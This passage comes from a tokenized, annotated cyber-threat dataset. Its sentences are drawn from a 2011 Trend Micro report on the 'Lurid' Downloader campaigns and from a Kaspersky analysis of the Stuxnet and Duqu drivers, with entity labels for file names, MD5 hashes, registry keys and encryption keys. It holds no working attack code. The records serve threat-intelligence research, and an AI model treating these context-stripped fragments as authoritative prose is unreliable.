"Vietnam", ",", "India", ",", "Mongolia", "and", "China", "."], ["In", "total", ",", "there", "were", "victims", "in", "61", "different", "countries", "."], ["The", "data", "covers", "compromised", "computers", "that", "connected", "to", "the", "command", "and", "control", "servers", "in", "June", "and", "July", "2011", "."], ["The", "top", "10", "countries", "of", "victims", "(", "based", "on", "the", "2272", "IP", "addresses", ")", "are", ":", "RU", "KZ", "UA", "VN", "UZ", "BY"], ["IN", "KG", "MN", "CN", "12", "|", "RESEARCH", "PAPER", "1063"], ["325", "102", "93", "88", "67", "66", "49", "42", "39", "THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "MALWARE", "CAMPAIGNS"], ["As", "noted", "earlier", ",", "there", "is", "a", "unique", "identi\ufb01er", "built", "in", "to", "instances", "of", "the", "malware", "sent", "out", "by", "the", "attackers", "that", "allows", "them", "to", "keep", "track", "of", "the", "computers", "compromised", "by", "speci\ufb01c", "campaigns", "."], ["In", "total", ",", "we", "found", "301", "campaign", "codes", "."], ["This", "means", "that", "the", "attackers", "sent", "out", "at", "least", "301", "different", "instances", "of", "the", "\u201c", "Lurid", "Downloader", ".", "\u201d"], ["There", "are", "high", "concentrations", "of", "victims", "within", "a", "single", "country", "for", "each", "instance", "of", "the", "malware", "campaign", "indicating", "that", "the", "distribution", "of", "the", "malware", "is", "targeted", "at", "speci\ufb01c", "countries", "or", "regions", "."], ["Campaign", "Count", "Countries", "strong", "668", "All", "68", "of", "the", "compromised", "counters", "were", "in", "Vietnam", "."], ["ejun0708", "63", "5", "in", "Russia", ",", "3", "in", "Ukraine", "and", "1", "each", "in", "Czech", "Republic", ",", "Kazakhstan", ",", "Switzerland", ",", "Tajikistan", "and", "Belarus"], ["ejun0614", "42", "27", "in", "Russia", ",", "3", "in", "China", ",", "3", "in", "Kyrgyzstan", ",", "2", "in", "Tajikistan", "and", "1", "each", "in", "UK", ",", "US", ",", "S.", "Korea", ",", "Czech", "republic", ",", "Pakistan", ",", "Germany", "and", "Kazakhstan", "."], ["strongNewDns", "34", "All", "34", "of", "the", "compromised", "counters", "were", "in", "Vietnam", "."], ["ejun0509", "32", "31", "in", "Russia", ",", "1", "in", "Ukraine", "ejun0511", "29", "21", "in", "Russia", ",", "4", "in", "Ukraine", ",", "2", "in", "Kazakhstan", ",", "and", "1", "each", "in", "Czech", "Republic", "and", "Azerbaijan", "7", "-", "28", "28", "24", "in", "Vietnam", "and", "one", "each", "in", "UAE", ",", "Cambodia", ",", "Thailand", "and", "China", "ejun0503", "25", "23", "in", "Russia", "and", "1", "each", "in", "Ukraine", "and", "Czech", "Republic", "0dayaug12.exe", "22", "20", "in", "Belarus", "and", "2", "in", "Kazakhstan", "C:\\WINDOWS\\"], ["22", "system32\\desp.exe", "12", "in", "US", ",", "5", "in", "Russia", ",", "3", "in", "The", "Netherlands", ",", "and", "1", "each", "in", "Switzerland", "and", "the", "European", "Union", "."], ["There", "were", "also", "speci\ufb01c", "campaigns", "that", "affected", "a", "very", "small", "number", "of", "victims", "."], ["In", "fact", ",", "nearly", "60", "%", "(", "59.4", "%", ")", "of", "all", "the", "campaigns", "affected", "only", "1", "or", "2", "victims", "."], ["There", "were", "115", "campaigns", "that", "only", "compromised", "1", "victim", "and", "64", "campaigns", "that", "only", "compromised", "2", "victims", "."], ["This", "indicates", "the", "precision", "in", "malware", "campaigns", "that", "target", "speci\ufb01c", "entities", "."], ["13", "|", "RESEARCH", "PAPER", "THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "NOTEWORTHY", "COMPROMISED", "ORGANIZATIONS"], ["We", "were", "able", "to", "use", "reverse", "DNS", "queries", "and", "WHOIS", "lookups", "to", "determine", "the", "identity", "some", "of", "the", "compromised", "hosts", "."], ["There", "are", "high", "pro\ufb01le", "diplomatic", "organizations", "that", "have", "been", "compromised", "as", "well", "as", "agencies", "relating", "to", "space", "and", "research", "institutions", "."], ["14", "|", "RESEARCH", "PAPER", "Country", "Sector"], ["Date", "Camapign", "France", "GOV", "Sat", "Jun", "18", "10:22:22", "2011", "0dayjun14.exe", "Switzerland", "GOV", "Mon", "Jul", "11", "11:28:02", "2011", "LOGO076", "UK", "MEDIA"], ["Thu", "Jun", "16", "08:18:44", "2011", "0dayapr13.exe", "Germany", "SPACE"], ["Mon", "Jun", "20", "09:43:48", "2011", "6", "-", "7", "Spain", "SPACE", "Mon", "Jul", "4", "11:38:35", "2011", "6", "-", "27", "Russia", "GOV", "Tue", "Jun", "7", "12:15:34", "2011", "lh0603hy", "Russia", "GOV", "Mon", "Jul", "11", "07:17:46", "2011", "ejun0708", "Russia", "GOV", "Tue", "Jun", "28", "00:54:16", "2011", "110608", "Russia"], ["SPACE", "/", "GOV", "We", "d", "Jul", "13", "04:21:20", "2011", "aoo526pdf", "Russia", "SPACE"], ["We", "d", "Jul", "13", "07:14:38", "2011", "winupdate712", "Russia", "SPACE", "Mon", "Jul", "25", "08:43:40", "2011", "6", "-", "7", "Russia", "SPACE"], ["We", "d", "Jul", "13", "02:45:59", "2011", "coo328xls", "Russia", "RESEARCH", "/", "GOV"], ["We", "d", "Jul", "13", "06:06:06", "2011", "aoo0516pdf", "Russia", "RESEARCH", "We", "d", "Jul", "20", "12:01:00", "2011", "6", "-", "27", "Russia", "RESEARCH", "Mon", "Jul", "11", "07:38:14", "2011", "winupdate0706", "Russia", "RESEARCH"], ["Tue", "Jun", "14", "08:09:23", "2011", "110303", "Russia", "RESEARCH", "We", "d", "Jul", "13", "02:46:24", "2011", "coo0609doc", "Russia", "RESEARCH", "We", "d", "Jul", "13", "02:47:33", "2011", "sat0608old", "Russia", "RESEARCH"], ["Tue", "Jun", "14", "02:49:58", "2011", "winupdate", "Russia", "RESEARCH"], ["Tue", "Jun", "14", "02:38:52", "2011", "satellite0608", "Russia", "MEDIA"], ["Tue", "Jun", "14", "04:25:12", "2011", "ejun0125", "China", "(", "Russia", ")", "BUSINESS"], ["Tue", "Jun", "7", "13:17:39", "2011", "lh0603hy"], ["Russia", "BUSINESS"], ["Tue", "Jun", "14", "07:28:25", "2011", "z11apr27aboky", "Russia", "GOV"], ["Tue", "Jun", "14", "11:49:35", "2011", "z10nov23k", "Russia", "POLITICAL", "PARTY"], ["Tue", "Jun", "14", "14:05:24", "2011", "LOGO69", "Russia", "(", "Ukraine", ")", "GOV", "Mon", "Jul", "4", "10:36:46", "2011"], ["LOGO704", "Turkmenistan", "GOV", "Mon", "Jun", "13", "07:28:59", "2011", "0dayjun09.exe", "Kyrgyzstan", "GOV", "Mon", "Jun", "13", "07:33:12", "2011", "0dayjun09.exe", "Kazakhstan", "GOV", "Mon", "Jun", "13", "06:06:47", "2011", "0daydec08.exe", "Kazakhstan", "GOV", "Mon", "Jun", "27", "15:15:42", "2011", "smross.exe"], ["THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "Ukraine", "GOV", "We"], ["d", "Jun", "22", "15:43:26", "2011", "LOGO615", "Kazakhstan", "GOV", "Mon", "Jun", "13", "06:06:47", "2011", "0daydec08.exe", "Kazakhstan", "GOV", "Mon", "Jun", "27", "15:15:42", "2011", "smross.exe", "Ukraine", "GOV", "We"], ["d", "Jun", "22", "15:43:26", "2011", "LOGO615", "Belarus", "GOV"], ["Thu", "Jul", "14", "17:58:48", "2011", "0dayaug12.exe", "Germany", "(", "Kazakhstan", ")"], ["GOV"], ["Tue", "Jun", "21", "10:07:49", "2011", "LOGO621", "Austria", "(", "Kyrgyzstan", ")"], ["GOV", "Mon", "Jun", "13", "09:34:45", "2011", "LOGO524", "Russia", "(", "Tajikistan", ")"], ["GOV"], ["Tue", "Jun", "7", "12:00:03", "2011", "lh0526w.exe", "Kazakhstan", "GOV", "Thu", "Jul", "7", "05:44:34", "2011"], ["LOGO0705", "Kyrgyzstan", "(", "Kazakhstan", ")"], ["GOV", "Tue", "Jul", "12", "10:57:17", "2011", "z10dec09UP.exe", "Kazakhstan", "(", "China", ")"], ["GOV", "Tue", "Jun", "14", "08:58:53", "2011", "LOGO69", "Kazakhstan", "RESEARCH"], ["Thu", "Jun", "16", "08:24:31", "2011", "LOGO616", "Belarus", "RESEARCH", "We", "d", "Jul", "13", "05:37:40", "2011", "services712", "Armenia", "RESEARCH"], ["Fri", "Jun", "24", "07:25:18", "2011", "LOGO624", "Kazakhstan", "MEDIA", "Mon", "Jun", "13", "08:17:29", "2011", "z10nov25knb", "Vietnam", "GOV", "Sun"], ["Jul", "3", "09:06:57", "2011", "strong", "China", "BUSINESS"], ["Sun", "Jun", "12", "06:02:11", "2011", "lh0517e.exe", "Uzbekistan", "GOV", "Tue", "Jun", "14", "05:41:09", "2011", "0dayjan27", "Vietnam", "GOV", "Tue", "Aug", "2", "12:57:36", "2011", "7", "-", "28", "DATA", "EX", "-", "FILTRATION"], ["While", "we", "were", "unable", "to", "recover", "the", "data", "obtained", "by", "the", "attackers", ",", "we", "were", "able", "to", "collect", "some", "of", "the", "command", "issued", "by", "the", "attackers", "that", "hint", "at", "their", "objectives", "."], ["We", "found", "that", "the", "attackers", "often", "issued", "the", "\u201c", "LS", "\u201d", "command", "to", "send", "a", "directory", "listing", "from", "speci\ufb01c", "directories", "on", "the", "compromised", "computers", "back", "to", "the", "command", "and", "control", "server", "."], ["We", "also", "observed", "the", "use", "of", "the", "\u201c", "SEND", "FILE", "\u201d", "that", "ordered", "the", "compromised", "computers", "to", "compress", ",", "split", "and", "upload", "speci\ufb01c", "\ufb01les", "(", ".rar", ",", ".xls", ",", ".doc", ")", "to", "the", "command", "and", "control", "server", "."], ["However", ",", "we", "were", "unable", "to", "recover", "the", "ex-\ufb01ltrated", "data", "."], ["15", "|", "RESEARCH", "PAPER"], ["THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "ATTRIBUTION"], ["Determining", "who", "is", "ultimately", "behind", "targeted", "malware", "attacks", "is", "dif\ufb01cult", "as", "it", "requires", "a", "combination", "of", "technical", "and", "contextual", "analysis", "and", "the", "ability", "to", "connect", "disparate", "pieces", "of", "information", "together", "over", "a", "period", "of", "time", "."], ["Moreover", ",", "any", "one", "researcher", "typically", "does", "not", "necessarily", "have", "all", "these", "pieces", "of", "information", "and", "must", "interpret", "the", "available", "evidence", "."], ["Too", "often", ",", "the", "determination", "of", "attribution", "is", "based", "on", "easily", "spoofed", "evidence", "such", "as", "IP", "addresses", "."], ["While", "many", "of", "these", "attacks", "are", "attributed", "to", "China", ",", "in", "this", "case", ",", "the", "IP", "addresses", "of", "the", "command", "and", "control", "servers", "were", "located", "in", "the", "United", "States", "and", "the", "United", "Kingdom", "."], ["However", ",", "the", "registration", "information", "of", "the", "domain", "names", "used", "indicates", "that", "the", "owners", "are", "in", "China", "."], ["In", "either", "case", ",", "the", "information", "is", "not", "dif\ufb01cult", "to", "manipulate", "."], ["The", "use", "of", "\u201c", "Enfal", "\u201d", ",", "the", "family", "of", "malware", "to", "which", "\u201c", "Lurid", "Downloader", "\u201d", "belongs", ",", "has", "been", "historically", "linked", "with", "threat", "actors", "in", "China", "."], ["In", "this", "case", ",", "the", "attack", "vector", "that", "we", "were", "able", "to", "analyze", "was", "related", "to", "the", "Tibetan", "community", "which", "indicates", "an", "association", "with", "China", "."], ["However", ",", "China", "was", "also", "a", "victim", "of", "\u201c", "Lurid", "Downloader", ".", "\u201d"], ["CONCLUSION"], ["In", "this", "report", "we", "have", "analyzed", "targeted", "malware", "attacks", "that", "have", "compromised", "sensitive", "locations", "in", "Russia", ",", "CIS", "countries", "and", "around", "the", "world", "."], ["The", "focus", "of", "the", "attacks", "appears", "to", "be", "on", "government", "networks", "and", "diplomatic", "missions", "as", "well", "and", "research", "institutions", "and", "space", "related", "agencies", "."], ["We", "found", "that", "the", "attackers", "engaged", "in", "over", "300", "campaigns", "and", "kept", "careful", "records", "of", "their", "victims", "and", "to", "what", "campaign", "compromised", "them", "."], ["Our", "analysis", "of", "the", "campaigns", "reveals", "that", "attackers", "engage", "in", "attacks", "that", "target", "communities", "in", "speci\ufb01c", "geographic", "locations", "as", "well", "extremely", "targeted", "campaigns", "that", "only", "affect", "one", "or", "two", "victims", "."], ["The", "precise", "nature", "of", "targeted", "malware", "attacks", "increases", "the", "dif\ufb01culty", "of", "defense", "."], ["With", "signi\ufb01cant", "reconnaissance", ",", "and", "possibly", "information", "gained", "from", "previously", "successful", "incursions", "into", "the", "target", "\u2019s", "network", ",", "the", "threat", "actors", "behind", "targeted", "malware", "attacks", "are", "able", "to", "customize", "their", "attacks", "to", "increase", "the", "probability", "of", "success", "."], ["Therefore", ",", "defenses", "against", "targeted", "malware", "attacks", "need", "to", "focus", "on", "detection", "and", "mitigation", "and", "not", "simply", "on", "prevention", "."], ["Through", "the", "exposure", "of", "the", "\u201c", "Lurid", "Downloader", "\u201d", "network", ",", "we", "aim", "to", "enable", "a", "better", "understanding", "of", "the", "extent", "and", "frequency", "of", "such", "attacks", "as", "well", "as", "the", "challenges", "that", "targeted", "malware", "attacks", "pose", "for", "traditional", "defenses", "."], ["Defensive", "strategies", "can", "be", "dramatically", "improved", "by", "understanding", "how", "targeted", "malware", "attacks", "work", "as", "well", "as", "trends", "in", "the", "tools", ",", "tactics", "and", "procedures", "of", "the", "threat", "actors", "behind", "such", "attacks", "."], ["By", "effectively", "using", "threat", "intelligence", "derived", "from", "external", "and", "internal", "sources", "combined", "with", "security", "tools", "that", "empower", "human", "analysts", ",", "organizations", "are", "better", "positioned", "to", "detect", "and", "mitigate", "targeted", "malware", "attacks", "."], ["16", "|", "RESEARCH", "PAPER", "TREND", "MICRO", "\u2122", "TRENDLABSSM", "Trend", "Micro", "Incorporated", "is", "a", "pioneer", "in", "secure", "content", "and", "threat", "management", "."], ["Founded", "in", "1988", ",", "Trend", "Micro", "provides", "individuals", "and", "organizations", "of", "all", "sizes", "with", "award", "-", "winning", "security", "software", ",", "hardware", ",", "and", "services", "."], ["With", "headquarters", "in", "Tokyo", "and", "operations", "in", "more", "than", "30", "countries", ",", "Trend", "Micro", "solutions", "are", "sold", "through", "corporate", "and", "value", "-", "added", "resellers", "and", "service", "providers", "worldwide", "."], ["For", "additional", "information", "and", "evaluation", "copies", "of", "Trend", "Micro", "products", "and", "services", ",", "visit", "our", "website", "at", "www.trendmicro.com", "."], ["TrendLabs", "is", "Trend", "Micro", "\u2019s", "global", "network", "of", "research", ",", "development", ",", "and", "support", "centers", "committed", "to", "24", "x", "7", "threat", "surveillance", ",", "attack", "prevention", ",", "and", "timely", "and", "seamless", "solutions", "delivery", "."], ["\u00a9", "2011", "by", "Trend", "Micro", ",", "Incorporated", "."], ["All", "rights", "reserved", "."], ["Trend", "Micro", ",", "the", "Trend", "Micro", "t", "-", "ball", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Trend", "Micro", ",", "Incorporated", "."], ["All", "other", "product", "or", "company", "names", "may", "be", "trademarks", "or", "registered", "trademarks", "of", "their", "owners", "."], ["THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"]]}, {"vertexSet": [[{"name": "Duqu", "pos": [5, 6], "sent_id": 1, "type": "TrojanHorse"}], [{"name": "Stuxnet", "pos": [29, 30], "sent_id": 3, "type": "Malware"}], [{"name": "~d", "pos": [28, 29], "sent_id": 8, "type": "Indicator"}], [{"name": "Mrxcls.sys", "pos": [0, 1], "sent_id": 16, "type": "File"}], [{"name": "Mrxcls.sys", "pos": [0, 1], "sent_id": 18, "type": "Indicator"}], [{"name": "Mrxnet.sys 17400", "pos": [3, 5], "sent_id": 18, "type": "Indicator"}], [{"name": "Jmidebs.sys 25552", "pos": [6, 8], "sent_id": 18, "type": "Indicator"}], [{"name": "Rootkit.Win32.Stuxnet.a", "pos": [19, 22], "sent_id": 44, "type": "File"}], [{"name": "rtniczw.sys", "pos": [3, 4], "sent_id": 46, "type": "File"}], [{"name": "546C4BBEBF02A1604EB2CAAAD4974DE0", "pos": [11, 12], "sent_id": 46, "type": "MD5"}], [{"name": "rndismpc.sys", "pos": [4, 5], "sent_id": 61, "type": "File"}], [{"name": "9AEC6E10C5EE9C05BED93221544C783E", "pos": [1, 2], "sent_id": 62, "type": "MD5"}]], "labels": [{"r": "P21", "h": 2, "t": 1, "evidence": [3, 8]}, {"r": "P21", "h": 4, "t": 1, "evidence": [3, 18]}, {"r": "P21", "h": 5, "t": 1, "evidence": [3, 18]}, {"r": "P21", "h": 6, "t": 1, "evidence": [3, 18]}], "title": "201110SecureListStuxnet", "sents": [["Stuxnet", "/", "Duqu", ":", "The", "Evolution", "of", "Drivers"], ["We", "have", "been", "studying", "the", "Duqu", "Trojan", "for", "two", "months", "now", ",", "exploring", "how", "it", "emerged", ",", "where", "it", "was", "distributed", "and", "how", "it", "operates", "."], ["Despite", "the", "large", "volume", "of", "data", "obtained", "(", "most", "of", "which", "has", "yet", "to", "be", "published", ")", ",", "we", "still", "lack", "the", "answer", "to", "the", "fundamental", "question", "-", "who", "is", "behind", "Duqu", "?"], ["In", "addition", ",", "there", "are", "other", "issues", ",", "mostly", "to", "do", "with", "the", "creation", "of", "the", "Trojan", ",", "or", "rather", "the", "platform", "used", "to", "implement", "Duqu", "as", "well", "as", "Stuxnet", "."], ["In", "terms", "of", "architecture", ",", "the", "platform", "used", "to", "create", "Duqu", "and", "Stuxnet", "is", "the", "same", "."], ["This", "is", "a", "driver", "file", "which", "loads", "a", "main", "module", "designed", "as", "an", "encrypted", "library", "."], ["At", "the", "same", "time", ",", "there", "is", "a", "separate", "configuration", "file", "for", "the", "whole", "malicious", "complex", "and", "an", "encrypted", "block", "in", "the", "system", "registry", "that", "defines", "the", "location", "of", "the", "module", "being", "loaded", "and", "name", "of", "the", "process", "for", "injection", "."], ["Conventional", "platform", "architecture", "for", "Stuxnet", "and", "Duqu"], ["This", "platform", "can", "be", "conventionally", "named", "as", "'", "Tilded", "'", "as", "its", "authors", "are", ",", "for", "some", "reason", ",", "inclined", "to", "use", "file", "names", "which", "start", "with", "\"", "~d", "\"", "."], ["We", "believe", "Duqu", "and", "Stuxnet", "were", "simultaneous", "projects", "supported", "by", "the", "same", "team", "of", "developers", "."], ["Several", "other", "details", "have", "been", "uncovered", "which", "suggest", "there", "was", "possibly", "at", "least", "one", "further", "spyware", "module", "based", "on", "the", "same", "platform", "in", "2007", "-", "2008", ",", "and", "several", "other", "programs", "whose", "functionality", "was", "unclear", "between", "2008", "and", "2010", "."], ["These", "facts", "significantly", "challenge", "the", "existing", "\"", "official", "\"", "history", "of", "Stuxnet", "."], ["We", "will", "try", "to", "cover", "them", "in", "this", "publication", ",", "but", "let", "us", "first", "recap", "the", "story", "so", "far", "."], ["The", "'", "official", "'", "Stuxnet", "story", "Let", "me", "start", "with", "a", "question", ":", "how", "many", "Stuxnet", "driver", "files", "are", "known", "?"], ["As", "of", "today", ",", "the", "correct", "answer", "would", "be", "four", "."], ["See", "below", "for", "more", "information", "about", "them", "."], ["Mrxcls.sys"], ["Size", "(", "bytes", ")", "19840", "Compilation", "date", "01.01.2009"], ["Mrxcls.sys", "26616", "01.01.2009", "Mrxnet.sys", "17400", "25.01.2010", "Jmidebs.sys", "25552", "14.07.2010", "File", "name", "Where", "and", "when", "it", "was", "used", "Stuxnet", "(", "22.06.2009", ")"], ["Stuxnet"], ["(", "01.03.2010/14.04.2010", ")"], ["Stuxnet"], ["(", "01.03.2010/14.04.2010", ")"], ["Presumably", ",", "Stuxnet", "Digital"], ["signature", "/", "signing", "date"], ["No"], ["Realtek", ",", "25.01.2010"], ["Realtek", ",", "25.01.2010"], ["Jmicron", ",", "unknown"], ["The", "first", "modification", "of", "the", "Stuxnet", "worm", ",", "created", "in", "2009", ",", "used", "only", "one", "driver", "file", "-", "mrxcls.sys", "without", "a", "digital", "signature", "."], ["In", "2010", ",", "the", "authors", "created", "the", "second", "driver", "mrxnet.sys", "(", "to", "hide", "the", "worm", "'s", "component", "files", "on", "USB", "drives", ")", "and", "equipped", "mrxnet.sys", "and", "mrxcls.sys", "drivers", "with", "digital", "certificates", "from", "Realtek", "."], ["The"], ["mrxnet.sys", "driver", "is", "of", "no", "great", "significance", "to", "our", "story", ",", "as", "it", "is", "a", "separate", "module", "not", "included", "into", "the", "general", "architecture", "of", "the", "platform", "."], ["On", "17", "July", "2010", ",", "ESET", "detected", "another", "driver", "\"", "in", "the", "wild", "\"", "-", "jmidebs.sys", "-", "which", "was", "very", "similar", "to", "the", "already", "known", "mrxcls.sys", ",", "but", "had", "been", "created", "just", "three", "days", "before", "it", "was", "discovered", "."], ["This", "driver", "was", "backed", "with", "a", "new", "certificate", "-", "this", "time", "from", "Jmicron", "."], ["Until", "recently", "it", "was", "unclear", "what", "the", "purpose", "of", "this", "file", "was", ",", "but", "popular", "opinion", "held", "that", "it", "was", "related", "to", "Stuxnet", "."], ["One", "theory", "is", "that", "the", "Stuxnet", "C&C", "was", "trying", "to", "replace", "the", "old", "version", "with", "the", "Realtek", "certificate", "with", "a", "new", "one", "."], ["In", "doing", "so", ",", "the", "authors", "of", "the", "worm", "were", "either", "hoping", "to", "prevent", "it", "being", "picked", "up", "by", "antivirus", "programs", ",", "or", "were", "replacing", "a", "certificate", "which", "had", "been", "blocked", "."], ["Unfortunately", ",", "this", "theory", "has", "not", "been", "confirmed", "-", "Jmidebs.sys", "has", "never", "been", "detected", "anywhere", "."], ["A", "new", "version", "of", "Stuxnet", "capable", "of", "installing", "the", "file", "has", "also", "not", "been", "found", "."], ["This", "is", "the", "official", "history", "of", "Stuxnet", "."], ["However", ",", "as", "I", "mentioned", "above", ",", "in", "the", "course", "of", "our", "research", "we", "have", "discovered", "new", "evidence", "which", "will", "be", "discussed", "below", "."], ["Previously", "unknown", "drivers"], ["rtniczw.sys", "While", "analyzing", "a", "user", "incident", "involving", "Duqu", ",", "we", "discovered", "something", "new", "-", "something", "that", "could", ",", "potentially", ",", "affect", "the", "whole", "Stuxnet", "story", "as", "we", "know", "it", "."], ["A", "strange", "file", "was", "discovered", "on", "the", "victim", "'s", "computer", ",", "which", "was", "detected", "by", "our", "antivirus", "engine", "as", "Rootkit", ".", "Win32.Stuxnet.a", "."], ["This", "verdict", "was", "supposed", "to", "correspond", "to", "the", "known", "file", "mrxcls.sys", "described", "above", ",", "but", "the", "detected", "file", "'s", "name", "and", "checksum", "were", "different", "!"], ["The", "file", "was", "rtniczw.sys", ",", "26,872", "bytes", "in", "size", ",", "MD5", "546C4BBEBF02A1604EB2CAAAD4974DE0", "."], ["The", "file", "was", "a", "little", "larger", "than", "mrxcls.sys", ",", "which", "had", "a", "Realtek", "digital", "signature", "."], ["This", "implied", "that", "rtniczw.sys", "also", "had", "a", "digital", "signature", "."], ["We", "managed", "to", "get", "a", "copy", "of", "the", "file", ",", "and", "we", "were", "amazed", "to", "find", "that", "it", "used", "the", "same", "Realtek", "certificate", ",", "but", "with", "a", "different", "file", "signing", "date", "from", "mrxcls.sys", ":", "rtniczw.sys", "was", "signed", "on", "18", "March", "2010", ",", "while", "the", "mrxcls", "driver", "had", "been", "signed", "on", "25", "January", "of", "the", "same", "year", "."], ["In", "addition", ",", "rtniczw.sys", "used", "a", "registry", "key", "and", "configuration", "data", "block", "that", "was", "not", "used", "in", "Stuxnet", "."], ["Stuxnet", "used", "the", "key", "\"", "MRxCls", "\"", "and", "the", "value", "\"", "Data", "\"", ",", "while", "in", "the", "case", "of", "rtniczw.sys", ",", "the", "key", "was", "\"", "rtniczw", "\"", "and", "the", "value", "was", "\"", "Config", "\"", "."], ["Detailed", "analysis", "of", "the", "code", "found", "in", "rtniczw.sys", "identified", "no", "other", "differences", "from", "the", "'", "reference", "'", "driver", ":", "this", "was", "the", "same", "mrxcls.sys", "file", ",", "created", "in", "the", "same", "year", ",", "on", "the", "same", "day", "and", "hour", "-", "on", "1", "January", "2009", "."], ["We", "searched", "for", "additional", "information", "about", "other", "users", "who", "had", "the", "same", "file", ",", "but", "were", "unable", "to", "find", "anything", "!"], ["Moreover", ",", "we", "could", "find", "no", "information", "at", "all", "about", "the", "file", "'s", "name", "(", "rtniczw.sys", ")", "or", "its", "MD5", "in", "any", "search", "engine", "."], ["The", "file", "had", "been", "identified", "only", "once", ":", "it", "had", "been", "sent", "for", "scanning", "to", "VirusTotal", "from", "China", "in", "May", "2011", "."], ["Apparently", ",", "the", "system", "that", "we", "were", "studying", "had", "been", "infected", "in", "late", "August", "2011", "."], ["It", "should", "be", "noted", "that", "we", "did", "not", "find", "a", "Stuxnet", "infection", "on", "the", "system", ":", "no", "additional", "files", "from", "the", "Stuxnet", "kit", "had", "been", "found", "."], ["However", ",", "we", "did", "find", "Duqu", "files", "."], ["We", "came", "to", "the", "conclusion", "that", "there", "could", "be", "other", "driver", "files", "similar", "to", "the", "\"", "reference", "\"", "file", "mrxcls.sys", ",", "which", "are", "not", "among", "known", "variants", "of", "Stuxnet", "."], ["rndismpc.sys", "A", "check", "in", "our", "malware", "collection", "helped", "identify", "another", "interesting", "file", "that", "was", "included", "in", "the", "collection", "over", "a", "year", "ago", "."], ["The", "file", "is", "named", "rndismpc.sys", ",", "it", "is", "19,968", "bytes", "in", "size", ","], ["MD5", "9AEC6E10C5EE9C05BED93221544C783E."], ["This", "turned", "out", "to", "be", "another", "driver", ",", "with", "functionality", "very", "nearly", "identical", "to", "that", "of", "mrxcls.sys", "apart", "from", "the", "following", "exceptions", ":", "1", "."], ["rndismpc.sys", "uses", "a", "registry", "key", "that", "is", "different", "from", "the", "keys", "used", "by", "both", "mrxcls", "and", "rtniczw", "-", "it", "is", "the", "key", "\"", "rndismpc", "\"", "with", "the", "value", "\"", "Action", "\"", ";", "2", "."], ["it", "uses", "an", "encryption", "key", "that", "is", "different", "from", "that", "used", "by", "mrxcls", "/", "rtniczw", "-", "0x89CF98B1", ";", "3", "."], ["the", "file", "'s", "compilation", "date", "is", "20", "January", "2008", ",", "i.e.", "a", "year", "before", "mrxcls", "/", "rtniczw", "were", "created", "."], ["Like", "rtniczw.sys", ",", "the", "file", "rndismpc.sys", "had", "never", "been", "encountered", "on", "our", "users", "'", "machines", "."], ["We", "do", "not", "know", "which", "malicious", "program", "installed", "it", "or", "which", "main", "module", "it", "was", "supposed", "to", "work", "with", "."], ["The", "connecting", "link", ":", "mrxcls.sys", "--", ">", "jmidebs.sys", "-->Duqu", "drivers"], ["The", "data", "obtained", "and", "the", "available", "information", "about", "the", "drivers", "used", "in", "Duqu", "(", "see", "The", "Mystery", "of", "Duqu", ",", "Part", "One", "and", "Part", "Two", ")", "can", "be", "summed", "up", "in", "the", "table", "below", ":", "Name", "rndismpc.sys", "mrxcls.sys", "mrxcls.sys", "(", "signed", ")"], ["rtniczw.sys", "(", "signed", ")"], ["jmidebs.sys", "(", "signed", ")", ".sys"], ["*", ".sys"], ["*", "CompiSize", "lation", "date", "20.01", "."], ["19968", "2008", "01.01", "."], ["19840", "2009", "01.01", "."], ["26616", "2009", "01.01", "."], ["26872", "2009", "14.07", "."], ["25502", "2010", "03.11", "."], ["Different", "2010", "17.10", "."], ["Different", "2011", "Main", "module", "Encryption", "Registry", "Value", "key", "key", "Device", "name", "Unknown", "0x89CF98B1", "rndismpc", "\"", "Action", "\"", "\"", "rndismpc", "\"", "Stuxnet.a", "0xAE240682"], ["MRxCls", "\"", "Data", "\"", "\"", "MRxClsDvX", "\"", "Stuxnet.b/.c", "0xAE240682", "MRxCls", "\"", "Data", "\"", "\"", "MRxClsDvX", "\"", "Unknown", "0xAE240682", "rtniczw", "\"", "Config", "\"", "\"", "RealTekDev291", "\"", "Unknown", "0xAE240682", "jmidebs", "\"", "IDE", "\""], ["Duqu", "0xAE240682", "\"", "FILTER", "\"", "Duqu", "0x20F546D3", "{", "3093983", "-", "109232", "-", "29291", "}", "{", "3093AAZ3", "-", "1092", "-", "29299391", "}", "{", "624409B3", "-", "4CEF-41c0\"FILTER", "\"", "8B81", "-", "7634279A41E5", "}", "*", "Known", "Duqu", "drivers", "have", "unique", "file", "names", "for", "each", "of", "the", "variants", "."], ["Their", "functionality", ",", "however", ",", "is", "absolutely", "identical", "."], ["According", "to", "our", "analysis", ",", "jmidebs.sys", "is", "the", "connecting", "link", "between", "mrxcls.sys", "and", "the", "drivers", "later", "used", "in", "Duqu", "."], ["The", "code", "of", "mrxcls", "and", "jmidebs", "drivers", "is", "largely", "similar", "."], ["Some", "small", "differences", "may", "be", "due", "to", "different", "settings", "and", "minimal", "changes", "in", "the", "source", "code", ",", "while", "the", "point", "of", "the", "code", "remains", "the", "same", "."], ["However", ",", "more", "significant", "changes", "can", "be", "found", "in", "several", "functions", ":", "1", "."], ["The", "service", "function", "which", "obtains", "addresses", "of", "API", "functions", ":"], ["The", "version", "in", "mrxcls", "uses", "the", "function", "MmGetSystemRoutineAddress", "for", "this", "purpose", "and", "the", "respective", "text", "names", "of", "the", "addresses", "of", "incoming", "API", "functions", "."], ["The", "version", "in", "jmidebs", "calls", "its", "own", "functions", "to", "obtain", "API", "addresses", "using", "hash", "-", "sums", "of", "their", "names", "."], ["The", "same", "functions", "are", "used", "in", "Duqu", "drivers", ",", "while", "the", "list", "of", "functions", "'", "hashes", "is", "twice", "as", "long", "."], ["2", "."], ["The", 